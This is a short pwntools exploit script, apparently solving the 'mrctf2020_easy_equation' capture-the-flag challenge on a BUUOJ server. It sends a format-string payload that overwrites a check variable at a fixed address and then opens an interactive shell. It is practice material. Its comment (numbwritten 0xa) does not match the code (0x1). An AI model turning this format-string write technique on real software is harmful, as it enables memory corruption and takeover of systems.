from pwn import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
binary = './mrctf2020_easy_equation'
io = process(binary)
io = remote('node4.buuoj.cn',29734)
elf = ELF(binary)

judge_addr = 0x60105C

#注意为什么要numbwritten=0xa，这里一开始错了，没理解为什么   原因是sprintf有9个字节："Repeater:" + 为了对齐加的 b"a"
payload = b'a' + fmtstr_payload(8, {judge_addr: 2},numbwritten=0x1, write_size='byte')

io.send(payload)

io.interactive()